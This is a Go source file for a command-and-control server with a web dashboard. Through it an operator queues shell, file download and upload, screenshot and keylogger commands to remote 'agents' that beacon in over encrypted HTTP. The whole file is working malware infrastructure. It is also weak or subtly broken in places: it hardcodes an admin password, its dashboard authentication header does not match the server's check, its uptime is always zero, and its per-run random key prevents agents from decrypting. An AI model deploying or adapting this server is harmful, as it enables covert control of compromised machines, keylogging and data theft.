package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

type Command struct {
	ID      string `json:"id"`
	Type    string `json:"type"`
	Payload string `json:"payload"`
	Target  string `json:"target"`
}

type Response struct {
	ID       string `json:"id"`
	Status   string `json:"status"`
	Data     string `json:"data"`
	AgentID  string `json:"agent_id"`
	Timestamp int64  `json:"timestamp"`
}

type Agent struct {
	ID        string    `json:"id"`
	IP        string    `json:"ip"`
	UserAgent string    `json:"user_agent"`
	LastSeen  time.Time `json:"last_seen"`
	Status    string    `json:"status"`
	Commands  []Command `json:"commands"`
}

type C2Server struct {
	agents     map[string]*Agent
	commands   map[string]Command
	responses  map[string]Response
	mutex      sync.RWMutex
	encryption bool
	key        []byte
	logFile    *os.File
}

var server *C2Server

func init() {
	server = &C2Server{
		agents:     make(map[string]*Agent),
		commands:   make(map[string]Command),
		responses:  make(map[string]Response),
		encryption: true,
		key:        generateKey(),
	}
	
	logFile, err := os.OpenFile("c2_server.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal("Failed to open log file:", err)
	}
	server.logFile = logFile
	
	log.SetOutput(io.MultiWriter(os.Stdout, logFile))
}

func generateKey() []byte {
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		log.Fatal("Failed to generate encryption key:", err)
	}
	return key
}

func (s *C2Server) log(level, message string) {
	timestamp := time.Now().Format("2006-01-02 15:04:05")
	log.Printf("[%s] %s: %s", timestamp, strings.ToUpper(level), message)
}

func (s *C2Server) encrypt(data []byte) ([]byte, error) {
	if !s.encryption {
		return data, nil
	}
	
	block, err := aes.NewCipher(s.key)
	if err != nil {
		return nil, err
	}
	
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	
	return gcm.Seal(nonce, nonce, data, nil), nil
}

func (s *C2Server) decrypt(data []byte) ([]byte, error) {
	if !s.encryption {
		return data, nil
	}
	
	block, err := aes.NewCipher(s.key)
	if err != nil {
		return nil, err
	}
	
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	
	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}
	
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

func (s *C2Server) authenticate(r *http.Request) bool {
	authHeader := r.Header.Get("Authorization")
	if authHeader == "" {
		return false
	}
	
	expectedHash := sha256.Sum256([]byte("admin:secret123"))
	providedHash := sha256.Sum256([]byte(authHeader))
	
	return string(expectedHash[:]) == string(providedHash[:])
}

func (s *C2Server) handleBeacon(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	
	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		s.log("error", "Failed to read request body: "+err.Error())
		http.Error(w, "Internal server error", http.StatusInternalServerError)
		return
	}
	
	decrypted, err := s.decrypt(body)
	if err != nil {
		s.log("error", "Failed to decrypt request: "+err.Error())
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}
	
	var response Response
	if err := json.Unmarshal(decrypted, &response); err != nil {
		s.log("error", "Failed to unmarshal response: "+err.Error())
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}
	
	s.mutex.Lock()
	defer s.mutex.Unlock()
	
	agentID := response.AgentID
	if agentID == "" {
		agentID = r.RemoteAddr
	}
	
	agent, exists := s.agents[agentID]
	if !exists {
		agent = &Agent{
			ID:        agentID,
			IP:        r.RemoteAddr,
			UserAgent: r.UserAgent(),
			Status:    "active",
			Commands:  []Command{},
		}
		s.agents[agentID] = agent
		s.log("info", "New agent connected: "+agentID)
	}
	
	agent.LastSeen = time.Now()
	agent.Status = "active"
	
	if response.ID != "" {
		s.responses[response.ID] = response
		s.log("info", fmt.Sprintf("Received response from %s: %s", agentID, response.Status))
	}
	
	commands := []Command{}
	for _, cmd := range agent.Commands {
		if cmd.ID != "" {
			commands = append(commands, cmd)
		}
	}
	
	responseData := map[string]interface{}{
		"commands": commands,
		"timestamp": time.Now().Unix(),
	}
	
	responseBytes, _ := json.Marshal(responseData)
	encrypted, err := s.encrypt(responseBytes)
	if err != nil {
		s.log("error", "Failed to encrypt response: "+err.Error())
		http.Error(w, "Internal server error", http.StatusInternalServerError)
		return
	}
	
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Write(encrypted)
}

func (s *C2Server) handleAdmin(w http.ResponseWriter, r *http.Request) {
	if !s.authenticate(r) {
		w.Header().Set("WWW-Authenticate", "Basic realm=\"C2 Admin\"")
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}
	
	switch r.Method {
	case "GET":
		s.handleAdminGet(w, r)
	case "POST":
		s.handleAdminPost(w, r)
	default:
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
	}
}

func (s *C2Server) handleAdminGet(w http.ResponseWriter, r *http.Request) {
	s.mutex.RLock()
	defer s.mutex.RUnlock()
	
	agents := make([]*Agent, 0, len(s.agents))
	for _, agent := range s.agents {
		if time.Since(agent.LastSeen) > 5*time.Minute {
			agent.Status = "offline"
		}
		agents = append(agents, agent)
	}
	
	response := map[string]interface{}{
		"agents":    agents,
		"commands":  s.commands,
		"responses": s.responses,
		"status":    "running",
		"uptime":    time.Since(time.Now()).String(),
	}
	
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(response)
}

func (s *C2Server) handleAdminPost(w http.ResponseWriter, r *http.Request) {
	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Failed to read body", http.StatusBadRequest)
		return
	}
	
	var command Command
	if err := json.Unmarshal(body, &command); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}
	
	if command.ID == "" {
		command.ID = fmt.Sprintf("cmd_%d", time.Now().UnixNano())
	}
	
	s.mutex.Lock()
	defer s.mutex.Unlock()
	
	if command.Target == "all" {
		for _, agent := range s.agents {
			agent.Commands = append(agent.Commands, command)
		}
		s.log("info", fmt.Sprintf("Command %s sent to all agents", command.ID))
	} else if agent, exists := s.agents[command.Target]; exists {
		agent.Commands = append(agent.Commands, command)
		s.log("info", fmt.Sprintf("Command %s sent to agent %s", command.ID, command.Target))
	} else {
		http.Error(w, "Target agent not found", http.StatusNotFound)
		return
	}
	
	s.commands[command.ID] = command
	
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "command queued", "id": command.ID})
}

func (s *C2Server) handleHealth(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":    "healthy",
		"timestamp": time.Now().Unix(),
		"agents":    len(s.agents),
	})
}

func (s *C2Server) cleanup() {
	ticker := time.NewTicker(1 * time.Minute)
	go func() {
		for range ticker.C {
			s.mutex.Lock()
			for id, agent := range s.agents {
				if time.Since(agent.LastSeen) > 10*time.Minute {
					delete(s.agents, id)
					s.log("info", "Removed offline agent: "+id)
				}
			}
			s.mutex.Unlock()
		}
	}()
}

func main() {
	port := "8080"
	if envPort := os.Getenv("C2_PORT"); envPort != "" {
		if p, err := strconv.Atoi(envPort); err == nil && p > 0 && p < 65536 {
			port = envPort
		}
	}
	
	server.log("info", "C2 Server starting on port "+port)
	server.log("info", "Encryption enabled: "+fmt.Sprintf("%t", server.encryption))
	
	http.HandleFunc("/beacon", server.handleBeacon)
	http.HandleFunc("/admin", server.handleAdmin)
	http.HandleFunc("/health", server.handleHealth)
	
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		w.Write([]byte(`
<!DOCTYPE html>
<html>
<head>
    <title>C2 Server Dashboard</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { background: #333; color: white; padding: 20px; border-radius: 5px; }
        .section { margin: 20px 0; padding: 20px; border: 1px solid #ddd; border-radius: 5px; }
        .agent { background: #f9f9f9; padding: 10px; margin: 10px 0; border-radius: 3px; }
        .online { border-left: 4px solid #4CAF50; }
        .offline { border-left: 4px solid #f44336; }
        button { background: #4CAF50; color: white; padding: 10px 20px; border: none; border-radius: 3px; cursor: pointer; }
        input, textarea { width: 100%; padding: 8px; margin: 5px 0; border: 1px solid #ddd; border-radius: 3px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>C2 Server Dashboard</h1>
            <p>Monitor and control connected agents</p>
        </div>
        
        <div class="section">
            <h2>Send Command</h2>
            <form id="commandForm">
                <input type="text" id="target" placeholder="Agent ID or 'all'" required>
                <select id="type" required>
                    <option value="shell">Shell Command</option>
                    <option value="download">Download File</option>
                    <option value="upload">Upload File</option>
                    <option value="screenshot">Screenshot</option>
                    <option value="keylog">Keylogger</option>
                </select>
                <textarea id="payload" placeholder="Command payload" required></textarea>
                <button type="submit">Send Command</button>
            </form>
        </div>
        
        <div class="section">
            <h2>Connected Agents</h2>
            <div id="agents"></div>
        </div>
        
        <div class="section">
            <h2>Command Responses</h2>
            <div id="responses"></div>
        </div>
    </div>
    
    <script>
        function loadData() {
            fetch('/admin', {
                headers: { 'Authorization': btoa('admin:secret123') }
            })
            .then(response => response.json())
            .then(data => {
                displayAgents(data.agents);
                displayResponses(data.responses);
            });
        }
        
        function displayAgents(agents) {
            const container = document.getElementById('agents');
            container.innerHTML = '';
            
            Object.values(agents).forEach(agent => {
                const div = document.createElement('div');
                div.className = 'agent ' + (agent.status === 'active' ? 'online' : 'offline');
                div.innerHTML = \`
                    <h3>\${agent.id}</h3>
                    <p><strong>IP:</strong> \${agent.ip}</p>
                    <p><strong>Status:</strong> \${agent.status}</p>
                    <p><strong>Last Seen:</strong> \${new Date(agent.last_seen).toLocaleString()}</p>
                \`;
                container.appendChild(div);
            });
        }
        
        function displayResponses(responses) {
            const container = document.getElementById('responses');
            container.innerHTML = '';
            
            Object.values(responses).forEach(response => {
                const div = document.createElement('div');
                div.className = 'agent';
                div.innerHTML = \`
                    <h4>Response \${response.id}</h4>
                    <p><strong>Agent:</strong> \${response.agent_id}</p>
                    <p><strong>Status:</strong> \${response.status}</p>
                    <p><strong>Data:</strong> \${response.data}</p>
                \`;
                container.appendChild(div);
            });
        }
        
        document.getElementById('commandForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const command = {
                target: document.getElementById('target').value,
                type: document.getElementById('type').value,
                payload: document.getElementById('payload').value
            };
            
            fetch('/admin', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': btoa('admin:secret123')
                },
                body: JSON.stringify(command)
            })
            .then(response => response.json())
            .then(data => {
                alert('Command sent: ' + data.id);
                loadData();
            });
        });
        
        setInterval(loadData, 5000);
        loadData();
    </script>
</body>
</html>
		`))
	})
	
	server.cleanup()
	
	server.log("info", "Server started successfully")
	server.log("info", "Dashboard available at: http://localhost:"+port)
	server.log("info", "Admin API available at: http://localhost:"+port+"/admin")
	server.log("info", "Beacon endpoint available at: http://localhost:"+port+"/beacon")
	
	if err := http.ListenAndServe(":"+port, nil); err != nil {
		server.log("fatal", "Server failed to start: "+err.Error())
		os.Exit(1)
	}
}
